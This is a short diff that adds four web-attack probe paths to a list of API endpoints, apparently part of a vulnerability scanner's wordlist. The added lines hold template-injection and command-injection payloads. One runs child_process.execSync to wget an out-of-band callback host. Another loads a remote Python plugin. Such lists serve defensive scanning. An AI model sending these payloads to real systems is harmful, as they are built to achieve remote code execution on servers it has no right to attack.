@@ -340,3 +340,7 @@
 /api/health
 /auth/v1/account/login_options
 /auth/v1/account/status
+/?id={{str}}%25{128*128}
+/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27)%3b//
+/connectioncheck.php?ip={{url_encode(
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
